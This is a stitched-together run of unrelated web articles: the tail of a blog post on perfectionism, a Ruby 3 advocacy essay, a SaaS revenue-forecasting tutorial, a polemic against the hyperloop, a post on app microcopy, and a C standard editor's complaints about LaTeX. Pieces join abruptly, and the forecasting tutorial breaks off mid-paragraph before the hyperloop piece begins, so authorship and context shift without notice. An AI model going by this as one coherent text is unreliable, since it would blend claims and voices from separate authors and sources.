<p>Apart from requiring more time and effort, this can make even seemingly trivial tasks feel daunting. Internally, if you know that a short email will take an hour and a half it’s going to loom large even if you have trouble explaining quite why such a small thing is making you feel overwhelmed.</p>
<hr>
<p><strong>What’s helped me:</strong> A likely culprit is overestimating the consequences of mistakes. One solution is to be concrete and write down what you expect to happen if it turns out you have a typo, miss a shot, or bomb a test. Sometimes all it takes to readjust is examining those expectations consciously. Other times you’ll need to experience the ‘failure’, at which point you can compare it to your stated expectations.</p>
<hr>
<h3>Why perfectionists give up on hobbies and tasks easily</h3>
<p>Another way to look at this is: if you don’t expect to reach high standards, a project just doesn’t seem worth doing.</p>
<p><img data-attachment-id="2368" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/adequateresults/" data-orig-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=1266%2C744&amp;ssl=1" data-orig-size="1266,744" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="AdequateResults" data-image-description="" data-medium-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=300%2C176&amp;ssl=1" data-large-file="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?fit=630%2C370&amp;ssl=1" loading="lazy" src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;ssl=1" alt="AdequateResults" width="630" height="370" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/jessegalef.com/wp-content/uploads/2020/08/adequateresults.png?resize=630%2C370&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>The result is a kind of min-max of approach to life: If you can’t excel, don’t bother spending time on it.</p>
<p>That’s not necessarily a bad thing!</p>
<p>However, we don’t always have control. In my nonprofit communications career, I sometimes got assigned to write press releases on topics that *might* get attention, but which seemed not newsworthy to me. It may have still been worth the few hours of my time in case it grabbed a reporter’s eye. It was important to keep my job. But I had so. much. trouble. getting myself to do the work.</p>
<p>Even in the personal realm, picking up a new hobby is made difficult. If it doesn’t seem like you’re going to be amazing at it, the hobby as a whole loses its luster.</p>
<hr>
<p><strong>What’s helped me: </strong>A big problem for me has been overlooking the benefits gained from so-called “failure”. Once I start to factor in e.g. how much I expect to learn (so that I can do better in the future) I end up feeling much better about giving things a shot.</p>
<hr>
<h3>Why procrastination (and anxiety) are common</h3>
<p>At a granular scale, the problem becomes worse. Rather than “How good do I expect to feel at the end of this?” our emotional reaction is probably trained by the in-the-moment “How much happier do I expect to feel as a result of one more bit of work?”</p>
<p>In other words, we can view the derivative/slope of these graphs as motivation:</p>
<p><img data-attachment-id="2367" data-permalink="https://jessegalef.com/2020/08/09/a-pretty-good-mathematical-model-of-perfectionism/motivationcurves/" data-orig-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=1198%2C608&amp;ssl=1" data-orig-size="1198,608" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="MotivationCurves" data-image-description="" data-medium-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=300%2C152&amp;ssl=1" data-large-file="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?fit=630%2C320&amp;ssl=1" loading="lazy" src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?resize=630%2C320&amp;ssl=1" alt="MotivationCurves" width="630" height="320" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/jessegalef.com/wp-content/uploads/2020/08/motivationcurves.png?resize=630%2C320&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>With a perfectionist mindset, the bigger and further away a goal is, the more difficult it will be to feel motivated in the moment.&nbsp; For much of the time, we’re trying to push ourselves to work without getting any internal positive reinforcement.</p>
<p>This is a particular issue in the Effective Altruism movement where the goal is to *checks notes* Save the World. Also, to (“Figure out how to do the most good, and then do it.”)</p>
<p>It’s true that as a perfectionist nears their goal, they’re extremely motivated! But that also means that the stakes are very high for every decision and every action.&nbsp; …Which is a recipe for anxiety. Terrific.</p>
<hr>
<p><strong>What’s helped me: </strong>To the extent that I can, I find that breaking tasks into pieces helps. If I think of my goal as “Save the World”, another day of work won’t feel very important. But a goal of “Finish reading another research paper” is something I can make real progress on in a day!</p>
<hr>
<h2>All models are wrong, but some are useful</h2>
<p>This framework isn’t perfect. Neither is this writeup. (I’m hyper-aware.) But this idea has been in my head, in my drafts folder, and unfinished for months. Rather than give in to the sense that I “should” keep working on it, I’m going to try following my own advice. I’m remembering that:</p>
<ul>
<li>I’ve clarified my thinking a ton by writing everything down.</li>
<li>The consequences of a sloppy post in are minimal in the big scheme of things.</li>
<li>This isn’t supposed to be my final conclusion – it’s one step on the path</li>
</ul>
<p>Even if it’s not perfect, perhaps the current iteration of this framework can help you understand me, yourself, or perfectionists in your life.</p>
<p>I used to have this “DONE IS BETTER THAN PERFECT” poster draped over a chair in my office. I never got around to hanging it up, but honestly? It seems better that way.</p>

November 13, 2020 | https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/ | <a href="https://web.archive.org/web/*/https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We’ve been living in the shadow of Ruby 2 for seven years now. Seven! <a href="https://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/">Ruby 2 was released in 2013</a> (which incidentally is the same year as the initial public release of React 0.3.0!).</p>

<p>In that span of time, Ruby performance has improved <em>significantly</em> and many, many enhancements to the language have benefited a great many people and projects. We’ve seen companies using Ruby and in many cases Rails become bedrocks of developer and consumer internet infrastructure. GitHub. Shopify. Stripe. Square. AirBnB.</p>

<p>But there has also been some consternation along the way. Is Ruby really a top-tier programming language able to compete with the likes of Javascript, Python, PHP, Go, and beyond? Or was it just a DHH-fueled hype-cycle doomed to inevitable relative obscurity as other technologies and frameworks ascended in its wake? (I don’t actually believe anyone seriously thinks this any more, but you still see the stray head-scratcher whiz by on Hacker News.)</p>

<p>Now we are mere weeks away from a major new Ruby release: version 3. While Ruby 3 is an exciting update with lots of features that make it interesting both now and in the future with various point updates promising even more goodies, I think it’s the <strong>psychology</strong> of turning over from major version 2 to 3 that is most vital to the future health of the community.</p>

<p>Ruby 3 isn’t just a new version. <strong>It’s a new era.</strong></p>

<p>What does this era represent? Let’s list a few talking points I hope we’ll start to push <em>hard</em> and <em>often</em> as Rubyists:</p>

<h3 id="ruby-3-is-fast">Ruby 3 is Fast</h3>

<p>No, I don’t mean Ruby 3 suddenly got a whole lot faster than Ruby 2.7. I mean that Ruby 3 is <em>fast compared to Ruby 2</em>. It’s unfortunate that much of the “Ruby is slow” meme has been a laggard perspective stemming from people’s experiences <em>years ago</em> with the language, or an old version of Rails, or Jekyll, or…the fact is it just wasn’t the zippy experience we’re pleased to enjoy today.</p>

<p>Do we still want even better performance? Of course! But at this point, Ruby is plenty fast as compared to many other “scripting” languages. Most of the time it’s on par with Python. It’s even on par with Javascript. (What? Don’t believe me? <a href="https://css-tricks.com/comparing-static-site-generator-build-times/">Check out how similar Jekyll and Eleventy perform as static site generators.</a>) And as Nate Berskopec often reminds us, your Rails app can perform quite well with just a bit of fine-tuning, and often the typical bottlenecks lie elsewhere in the stack (database, web server, etc.)</p>

<h3 id="ruby-3-is-easy">Ruby 3 is Easy</h3>

<p>These days, you don’t need to wrestle with gem dependency hell or pray to the gods to get Ruby or a Ruby extension to compile. That was “old Ruby”. New Ruby is using a fancy-pants version manager like <code>rbenv</code> combined with Bundler 2.</p>

<p><strong>It just works.</strong></p>

<p>Truly, Ruby is the first thing I install on any new Mac or Linux machine I operate and getting things set up is a piece of cake. Installing Rails. Installing Bridgetown. Installing…whatever. It. Just. Works.</p>

<p>We also have things like Docker and WSL to make things <em>much</em> easier to accomplish on Windows machines if you get stuck wrestling with Win-native Ruby. Heck, you can upload your entire dev environment into the cloud now and use VSCode with remote extensions.</p>

<p>Are there ways Bundler and the ecosystem around Ruby versions/dependencies could be improved? No doubt. But it’s in no way any more complicated or fiddly than the world of npm/yarn, and you don’t see the angry hordes trying to burn down the barn doors over there (except maybe the Deno folks 😉).</p>

<h3 id="ruby-3-is-sleek">Ruby 3 is Sleek</h3>

<p>Ruby isn’t the best choice for all problem domains. It just isn’t. But when it comes to “standard” web development, it often <em>is</em> the best choice. It really is! Spend a few days writing NestJS + TypeORM Typescript code and then come back to Rails. It’s like a breath of fresh, sweet air. And that’s not just when you’re writing controllers or models…it goes all the way up and down the stack.</p>

<p>Ruby just makes everything <em>better</em>. Less code. Less boilerplate. Less ceremony. More streamlined. More properly object-oriented. More polished and pleasurable to read and write. Certainly one could posit there are other web frameworks/languages which have much going for them as well. Laravel is popular with PHP devs, and for good reason. Django is popular with Pythonistas. But can anyone say with a straight face that, all things being equal, PHP is a “superior” programming language to Ruby? Can anyone say that Python—taken as a whole—is more suited to building a website than Ruby is?</p>

<p>I think not. While Ruby wasn’t originally invented as a way to supercharge web development, it found its niche in the rise of such amazing projects as Rails, Rack, Jekyll, plus great APIs by Stripe and many others. It rode much of the early wave of Web 2.0 hits, and that heritage continues to benefit us today.</p>

<h3 id="ruby-3-is-here-to-stay">Ruby 3 is Here to Stay</h3>

<p>Ruby 3 isn’t just another notch on the belt of recent Ruby releases. It’s <strong>Ruby 3.0</strong>. That means we can look forward to 3.1, 3.2, 3.3, and beyond. This is the beginning of a whole new era. New innovations. New patterns. Exciting ideas fusing concepts from other technologies with The Ruby Way. Fresh blood coming into the ecosystem. (Anecdotally, I’m seeing newbies plus returning old-timers jumping into Ruby-based forums and chat rooms <em>all the time</em>, and the pace of interesting new Ruby gems bursting onto the scene finally seems to be increasing after a few years of ho-hum incremental progress.)</p>

<p>The takeaway is this: Ruby 3 represents a moment when we should stand proud as Rubyists and unabashedly proclaim to the bootcamps and engineering departments of the world that we’re open and ready to do business large and small. Sure you could pick something other than Ruby with which to build the next great internet success story. But you’ll definitely be in good company if you do pick Ruby. After all, it’s more likely than not your code will be living in a repository overseen by Ruby (GitHub), you’ll be communicating with your fellow colleagues via Ruby (Basecamp &amp; HEY), you’ll be asking for support via Ruby (Discourse forums), you’ll be researching the latest developer news and techniques via Ruby (Dev.to), and you’ll be spinning up your dev machine while wearing that l33t geek t-shirt you got from an indie vendor via Ruby (Shopify)—that is, after you paid for it via Ruby (Stripe). And when you’re exhausted from all that coding and need to unwind at a private cottage by the beach, Ruby will help you out there too (AirBnB).</p>

<p><em>Excelsior!</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <!-- DESKTOP -->
      <p>
        <h2>SaaS Revenue Forecasting</h2>

        <h2>SaaS Revenue Forecasting</h2>
      </p>

      <!-- DESKTOP -->
      

      <!-- MOBILE -->
      
      

      

      <div><p>
        There are many reasons you might want to create a financial forecast, most of which boil down to either 1) helping you manage the business and understand its dynamics better, or 2) telling the story of the company to others (whether the internal team, senior management, the board, investors, or prospective investors).
        </p><p>
        Here we’ll show you how to forecast revenue (and associated key metrics) for a subscription SaaS business.
        </p></div>

      <div><p>
        If you'd like to follow along in Excel, here's the file we'll be walking through (though you'll still be able to follow along without it):
        </p><a href="#" type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" rel="nofollow" onclick="download_file(event)">
          <p><i></i>Download the Example Model
          </p>
        </a>
      </div>



      

      <div><p>
        We’ll start first by forecasting our number of active subscribers. To do this, we forecast two key components: The number of new subscribers in a given month, and the number of canceled subscriptions (or “churn”).
        </p><p>
        To begin with a simple illustration, we’ll assume that we win 10 new subscribers per month. We’ll also assume that these subscriptions are cancellable any time, and that 10% of existing subscribers choose to cancel each month.
        </p><p>
        The beginning # of active subscribers in any period equals the ending number from the prior month. We refer to this method of forecasting as a “screw”.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-1.png"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-1.png" data-enlargeable=""></p><p>
              <span>
                A basic subscriber forecast.
              </span>
            </p>
        </div>
      </div>

      <p>
        As a quick aside, there are many other ways to go about forecasting churn, like analyzing cohort behavior over time, to potentially get to a more accurate projection. Our view is that it’s only worth getting into that level of detail once the company has reached a certain level of maturity, likely in the range of several thousand subscribers. Before then though, the simpler monthly churn rate is the approach we most often recommend because it’s easier to calculate, easier to forecast, and it prevents you from getting bogged down in unnecessary detail and drawing conclusions from too sparse of data.
        </p>

      

       <div>
        <!-- <br /><br /> --><p>
        So now we have a simple framework for forecasting our number of active subscribers for any period. Next we add in our assumption on revenue per month, and multiply that by our # of active subscribers to get total revenue per month.
        </p><p>
        We'll add in a calculation for ARR (Annual Recurring Revenue) here as well by simply multiplying monthly revenue by 12.
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-2.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-2.png" data-enlargeable=""></p><p>
              <span>
                Monthly Subscription Revenue = [ Ending # of Active Subscribers ] * [ Avg Revenue / Subscriber ]
              </span>
            </p>
        </div>
      </div>

      <p>
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. 
        </p>

      

      <div>
        <!-- <br /><br />
        We’ve now accomplished our goal of forecasting subscription revenue for our SaaS business. Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say that charge is $5k.
        <br /><br /> --><p>
        Next, let's say we charge some consulting fees to implement our product any time we get a new subscriber, and let's say we charge $5k. You can see that logic added in below, and we've also totaled up these two revenue lines (Subscription Revenue and Implementation Revenue) to get Total Revenue. 
        </p></div>

      <div>
        <div>
          <!-- <img class="card-img-top" src="/assets/blog/saas-revenue/saas-rev-3.png" alt="Revenue"> -->
          <p><img src="https://s3.us-east-2.amazonaws.com/modeloptic-public/blog/saas-revenue-forecasting/saas-rev-3.png" data-enlargeable=""></p><p>
              <span>
                Note that our ARR calculation here does not include the new non-recurring services revenue.
              </span>
            </p>
        </div>
      </div>

      

      <div>
        <!-- <br /><br /> --><p>
        We could also get a bit more sophisticated about how we forecast our number of new customers each month instead of simply hard-coding our new customer count at 10 per month. Let’s say our primary customer acquisition method is converting visitors from our website. For any set of website visitors, some of them contact us to become a lead, and then some of those leads convert into paying customers.
        </p><p>
        For starting baseline assumptions, let's say we get 1,000 website visitors per month, 2% of those convert into leads, 20% of our leads convert into paying customers, and our marketing efforts drive an increase in website visitors by 1,000 per month.

<p>Back in 2016 and 2017, one of the key components of mainstream tech coverage was something referred to as “vaporware“1: flashy, futuristic tech whose supposed potential often overshadowed its practicality or even, you know, actual existence in the real world. </p>



<p>This was a strange time in technology and tech journalism, one <a href="https://discourseblog.com/elon-musk-made-me-a-socialist/">I’ve written about at length before</a>. Uber did a whole <a href="https://www.theverge.com/2017/11/8/16613228/uber-flying-car-la-nasa-space-act">summit on how it was going to build flying cars,</a> self-driving technology was assumed to be right around the corner, and editors commissioned endless stories about <a href="https://www.mercurynews.com/2016/07/09/hacking-the-brain-silicon-valley-entrepreneurs-turn-to-fasting-and-smart-drugs/">“biohacking”</a> and <a href="https://www.bbc.com/news/technology-34210012">“transhumanism.”</a> One of the most interesting, most hyped, and most wildly impractical technologies from this era was the hyperloop. </p>



<p>I’m not going to go into huge detail on the hyperloop’s origin story, other than to say it owes its current popularity to the incredibly stupid personality cult surrounding Elon Musk. The technology is relatively easy to understand: you put a vehicle on a track inside a vacuum-sealed tube and it goes very fast. </p>



<p>The hilariously named Virgin Hyperloop2 passed a huge milestone this week when its first two passengers went down its 500-meter tube at a little over 100mph.3 The company celebrated the achievement by releasing a modest video comparing it to, among other things, the moment the Wright Brothers flew the first planes.</p>



<figure></figure>



<p>The core difference of the “hyperloop” versus, say, a train, is that the passenger-carrying vehicle inside the vacuum tube is not susceptible to air resistance, and can therefore attain speeds that are largely impossible or unsafe for an external train. However, as you can imagine, the logistics of building a perfectly vacuum-sealed tube big enough to carry a magnetic levitation vehicle are significantly more difficult than, say, building a train track (even a magnetic levitation one). </p>



<p>And as <a href="https://twitter.com/leftistthot420/status/1326559165838487552?s=20">many</a> <a href="https://twitter.com/hilaryagro/status/1326531535223345153?s=20">people</a> <a href="https://twitter.com/jkass99/status/1326607439240679424?s=20">pointed out</a> online, focusing on this kind of technology rather than, say, <em>trains</em>, is insanely stupid because we already have trains that are way better than this. We—by which I mean America— just don’t want to spend the money to build them. </p>



<figure></figure>



<p>Hyperloop is, in this context, the perfect example of the end-state death-cult capitalism that the American ruling class believes in. Virgin Hyperloop has raised some $400 million so far according to the <a href="https://www.nytimes.com/2020/11/08/business/virgin-hyperloop-passenger-test.html"><em>New York Times</em> story on the test</a>, which is half just a press release and then two interviews with experts saying “this shit won’t work, why are they doing this.” $400 million is a drop in the bucket compared to what it would cost to build an actual functioning high-speed rail network across the country.4</p>



<p>What hyperloop <em>does</em> do, however, is let the powers that be point to flashy efforts to make a cool technology real, like when Trump’s Transportation Secretary Elaine Chao5 <a href="https://www.mhlnews.com/transportation-distribution/article/22055573/dot-wants-to-weigh-in-on-emerging-transportation-technology">created</a> the Non-Traditional and Emerging Transportation Technology (NETT) Council to basically remove any federal regulation that would stop people flooding money into this shit.</p>



<p>Despite how all this sounds, I’m ultimately not a pessimist on the hyperloop as a whole. I think that worldwide mass transit is eventually going to need some kind of system that replaces air travel, which is extraordinarily energy-inefficient and currently relies entirely on fossil fuels to make it work. Ground transportation is largely restricted in speed by friction and air resistance, two things that a vacuum-sealed hyperloop system removes.6 I think eventually, a global network of 500 mph + transport technology might be feasible, but this is like 2200 tech we’re talking about, not 2020. Until then, we have trains. Trains that work, trains that can work even better, trains that are <em>incredibly efficient at moving goods, services, and people long distances and are relatively easy to power with non-fossil-fuel sources because they’re on static tracks. </em>Trains are good! </p>



<p>But this is America, and we cannot have nice things. Creating a nationwide high-speed rail service would cost money and political capital, and doing it right would require it to be a largely publicly-funded and administered project. Hyperloop, however, is marketing itself to the highest bidder: there’s a reason that the first contracts its various scammy companies sold were to do things like <a href="https://www.bbc.com/news/technology-49096675">connecting Riyadh to Jeddah in Saudi Arabia</a>.  </p>



<p>The core deceit of all of these technologies, from hyperloop to flying cars to neural nets, is that they will demonstrably improve everyday people’s lives at some point in their lifetimes. What the founders do is say “this is coming in 2020,” in 2016, and by 2020 they’re a bit behind schedule, but look, they have a flashy test to show you. The technology is coming soon, they promise. And when it gets here, when they “make it a reality,” to paraphrase almost every article written about vaporware, your life will get better. Only the tech never comes. And when it does, you won’t be able to afford it. It’s entirely possible that in our lifetimes the oil and gas billionaires in Saudi Arabia will be able to shoot themselves in tiny designer-branded pods with heated leather seats from one side of the Kingdom to the other. Maybe we’ll even have a line in the U.S. that Wall Street execs and DC lobbyists will use to blast up and down the Eastern Seaboard for business lunches. But you and me? We’ll be stuck on dilapidated Amtrak lines, no matter how many press tours Joe Biden takes on them, eating Cup Noodles from the dining car, or else stuck in our cars, choking the sky with emissions from the gas that we can barely afford to buy, stuck in traffic on roads falling further and further into disrepair, our only consolation the fact that the hyperloop’s vacuum-sealed tubes don’t have windows, so its riders won’t be able to gawk or gloat as they fly by at 800 miles per hour. </p>

        <article>
            <p>At Steamclock, we’re firm believers in the power of microcopy: the tiny phrases that lead customers through your app. Product design is all about communication, and an extremely cost-effective way to make your app communicate better – and thus retain, convert, and delight better – is to refine your microcopy.</p>

<p><img src="https://steamclock.com/img/posts/microcopy@2x.png" alt="Two Spies goes to great lengths to keep its tutorial text concise."></p>
<blockquote>
  <p>Two Spies goes to great lengths to keep its tutorial text concise.</p>
</blockquote>

<p>A key part of launching any new app is triaging and prioritizing common and high-impact user feedback. A couple years back we launched a finance app that was well received by users, but one of the most common complaints was people reporting that they couldn’t see their transaction history.</p>

<p>The thing was, we did have a transaction history feature – and as far as we could tell it was working. Pretty quickly we tracked the issue down to the fact that the server was only returning 3 months of data, which wasn’t enough for accounts that were used infrequently and thus had no recent transactions.</p>

<p>Naturally, we prioritized getting the server team to add support for longer-term transaction data. However, this turned out to be a bit involved, and it would take some time before it was implemented. In the meantime, “My transactions aren’t loading” continued to be one of the most common types of feedback we received.</p>

<p>Knowing microcopy is one of the fastest ways to improve UX, we loaded up the app and reviewed our message for when there were no recent transactions. We brought up one such test account, and the app dutifully reported:</p>

<p>“<strong>There are no transactions yet.</strong>”</p>

<p>But that wasn’t quite true, at least not in this case. This is a really common microcopy problem: the message implied that missing data didn’t exist, but it did – it had just been filtered out. We soon pushed an update for this case that explained much more clearly:</p>

<p>“<strong>No transactions from the last 3 months.</strong>”</p>

<p>Just like that, the complaints stopped. We went from receiving frequent annoyed reports that transactions were broken, to occasional kind suggestions that it would be nice if people could see more than 3 months of transactions. Everybody rejoiced.</p>

<h3 id="improving-your-labels">Improving your labels</h3>

<p>While this was an extremely easy UX win, it takes time and attention to write and maintain descriptive and context-aware messages. First, you need a product team with a fairly deep understanding of the product and how users think about it, enough that they can recognize opportunities to refine the copy. User testing is of course very helpful here.</p>

<p>You also need a shared understanding that brief, succinct text is worth the extra effort. Every extra label and word is a potential distraction and will discourage people from actually reading your copy.</p>

<p>More subtly though, context-specific microcopy needs some ongoing maintenance to ensure it stays accurate. When our client’s server team later added support for more than 3 months of transactions, we needed to coordinate with them to update the corresponding message in app. When coordination like this is impractical or unlikely to happen seamlessly, a more generic message can work. We could alternatively have just said “No recent transactions”, which isn’t as helpful to users but is less likely to “break”.</p>

<p>On the whole, iteratively refining and improving the messaging in your product is a great investment. While larger and more mature products often have a “growth team” that looks at microcopy as it relates to onboarding users and driving upgrades, anybody on your product team can have a positive impact just by spending a little bit of time thinking about what messages and button titles users are being shown. Having a product team that’s encouraged to use, think about, and really <em>try</em> the product is a big part of building something special.</p>

<p>We need to be exercising our apps not just from a functionality perspective, but from a perspective that asks, “What do people think when they see this? Will they actually read all of this?”</p>

<p>Bonus points if you actually ask them!</p>

<h3 id="8-starting-points-for-refining-your-apps-microcopy">8 starting points for refining your app’s microcopy</h3>

<ul>
  <li>What are some user behaviours you wish happened more often?</li>
  <li>What are frequent points of confusion? How do first-time users get exposed to those failure points in the app?</li>
  <li>How would a user who is aggressively skimming your app’s interface – not reading more than 6 words in a row – experience your onboarding process?</li>
  <li>How could some explanations or messages be more succinct?</li>
  <li>Are there features or actions that are underused because they’re worded in a non-obvious or unappealing way?</li>
  <li>Are there verbs that could be more thoughtfully named? Is there any generic “Continue” or “OK” buttons that could be clearer or more compelling?</li>
  <li>Is it possible to reduce the length of your onboarding or “tour” and sprinkle “just in time” messages and hints in the right places instead?</li>
  <li>Review a portion of your app’s errors and feedback messages, asking yourself for each message if it’s actually always true in the cases where that message is shown.</li>
</ul>

      <p>… I did it. I survived the Paper Blitz.<!--more--></p>



<p>For those of you who saw one of my earlier posts about <a href="https://thephd.github.io/your-c-compiler-and-standard-library-will-not-help-you">why most C implementations will purposefully blow your leg off even in the simplest of scenarios</a>, you may have noticed that I said I became the Project Editor for C. That’s a fancy way of saying I glue the standard together and produce both the Working Drafts/Working Papers (WDs/WPs), an Editor’s Report, and a Diffmark of the WD against the last published WD.</p>

<p>The <a href="https://drive.google.com/file/d/1IbngZ8StYVVYASd3WWuC4Uu9Xs39AF_N/view?usp=sharing">Working Draft is here</a> and the <a href="https://drive.google.com/file/d/1x4-eIBbQU3aXuORoNPSixbbl_ZKKfWfu/view?usp=sharing">Diffmarks are here</a> until I can publish it O f f i c i a l l y through the ISO® N-Paper™ System©.</p>

<p>Silly symbols aside, this was a slog through 30+ papers, a few defect reports, several editorial issues, and a minor cleanup of some of the sources. There was a backlog of about 3 meetings worth of papers to integrate, give or take a few from a few missed integrations in the past and a few things early-integrated from the meetings I had to cover. Despite some pretty crazy shenanigans when I was first handling becoming the Project Editor, everything ended up turning out smoothly! For the most part, anyways: I can already smell the editorial reports for all the things I probably messed up integrating. But what is it like, editing a Standards Document? What’s it like taking all those documents and turning them into a Working Draft?</p>

<p><img src="https://thephd.github.io/assets/img/2020-09-11/papers.png" alt="Image of a few of the papers from "></p>



<p>As with any project, it needs tools. This standard is built with a suite of tools any *Nix programmer will find comforting:</p>

<ul>
  <li><code>make</code>, for general build purposes</li>
  <li><code>sed</code> and <code>awk</code> for some reserved identifier / keyword shenanigans</li>
  <li><code>latex</code>, with the usual <code>pdflatex</code> and other shenanigans</li>
  <li><code>git</code>, to pull a previously tagged version of the standard to attempt to create useful diffmarks</li>
</ul>

<p>There’s also a bunch of other side tools used to generate some docs and other things, but that’s the core of it! As usual, nothing that discusses LaTeX would be complete without me saying the following…</p>

<h3 id="latex-is-horseshit">LaTeX is horseshit</h3>

<p>Boooiiiiiiiiiiii, do I hate LaTeX. The available LaTeX distributions are piss-tier garbage, printing a line number but not tracking any file information which makes any stream of multi-compilation completely useless and requiring separate invocations of the latex compiler for each file and magic to know which file you’re in. Not that that is how most people organize documents: <code>\input{the_file}</code> is the choice of developing a modular document in LaTeX land, complete with <code>#include</code>-like behavior but with 0% of the compiler Quality of Implementation.</p>

<p>Changing one thing of course results in a cascade of errors, warnings are split over multiple lines so as to make most error-parsing and warning-parsing regexen useless for trying to pick errors out of the literal 1 MB dump of errors, and trying to edit anything beyond the most basic of syntax is a complete slog. There is no reasonability, particular form, or dependable structure to LaTeX errors, other than “hard errors” starting with <code>!</code>.</p>

<p>Whitespace is not significant in the language (except when it is), people slap ad-hoc commands together to patch over LaTeX’s gross inefficiencies, adding that footnote catapults the next 3 paragraphs of text to write into the margins to the right, and have you heard of our Lord and Savior <code>OVERFULL HBOX</code>?</p>

<p>My eternal advice to everyone is to stop writing documents in LaTeX, please. You’d get farther and faster in even Microsoft Word, and it would render better for the internet. It has math support and it doesn’t poo all over the bed and scream when you want to try to add a mild margin to your author and title names, gargling with cryptic hints as to what will satisfy it enough to stop besmearing the nice linens in its dreadful output.</p>

<p>If your hands shake at the thought of not using BEAUTIFUL, LAYOUT-POWERFUL, HAND-BAKED LATEX on your résumé, there’s templates that make your Word Documents look like LaTeX ones. Just using a different Serif-y font will probably go a long way towards that look!</p>

<p>… That being said, the C Standard is written in LaTeX, so that’s what we’re editing.</p>

<h3 id="the-c-standard-is-mostly-nice">The C Standard is Mostly Nice</h3>

<p>Don’t get me wrong: LaTeX is garbage, but the Standard I was handed is of pretty good quality for a LaTeX document. It was easy to build and edit, I did not get lost once I had all the proper things installed (I did not decide to try to figure out the “minimum required distribution” and instead just shotgun <code>apt get install</code>d <code>texlive-full</code>), and the files were orderly. Referencing things is kind of terrible but that’s more of a LaTeX problem than a structure problem. I am also lucky to even be getting a LaTeX document: the standard used to be written in some God Awful Rotten Badness by the name of “TROFF”. I don’t know too much about it, and from the little that I did learn</p>

<p>I plan to keep it that way. 😄</p>

<p>There’s also the use of <code>latexdiff</code> and other things to produce nice diffmarks. It works out pretty decently, some of the marks are incredibly noisy. Still: as long as it highlights the general area of changes, it produces a pretty good proxy of “places to look for things that have changed”. It does ignore newly added files, which is why the lists at the beginning of the Working Paper – which detail the list of documents added from each meeting – are not all blue-highlighted. Having a nice LaTeX document with some really nice organization left to me by the last editor made the next part of this article the easiest…</p>



<p>Sweet, You Wrote a <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2335.pdf">Sick-Nasty Rad Paper</a> And Now It Needs To Be Put In The C Standard! So, how does it get there? Well, you don’t actually write a diff to the standard. At least, not a <em>real</em> diff: the sources to the C standard are hidden from the world to keep them safe, even when the time of Darkness descends upon us. What you write are <em>instructions to the project editor</em> (Hi, That’s Me!), and then I take your instructions and do my Best Effort™ to reflect them in the C Standard. Most of the wording gets approved by the Committee before-hand, and the edits are usually straightforward and simple. <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2517.pdf">For example</a>:</p>

<blockquote>
  <p>RECOMMENDATION: 3.4.3p4 should use a different example of undefined behavior, such as:</p>
  <blockquote>
    <p>EXAMPLE An example of undefined behavior is the behavior on dereferencing a null pointer.</p>
  </blockquote>
</blockquote>

<p>I then take these recommendations/instructions/suggestions and then go beat the LaTeX up on your behalf. One of the biggest benefits of this is that you don’t have to know LaTeX. Or how to build the standard, or any part of that. The Project Editor is the “Layer of Indirection” between you and the actual text of the standard. This also means that I could, in theory, rewrite the entire Standard as a Microsoft Word Document, or rewrite the entire thing in restructuredText and not one of you would know the difference. Or, so that’s the ideal situation, anyhow. Unfortunately, following people’s Standard-editing directives are not always the most straight forward…</p>

